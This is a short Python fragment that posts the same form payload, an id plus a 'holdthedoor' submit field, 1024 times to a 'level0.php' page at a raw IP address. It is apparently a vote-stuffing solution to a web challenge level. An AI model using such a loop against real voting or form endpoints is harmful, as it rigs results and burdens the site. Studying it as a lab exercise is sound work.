payload = {'id' : '264', 'holdthedoor' : 'Submit'}
for i in range(1024):
    r = requests.post('http://158.69.76.135/level0.php', data=payload)
    print(i + 1)
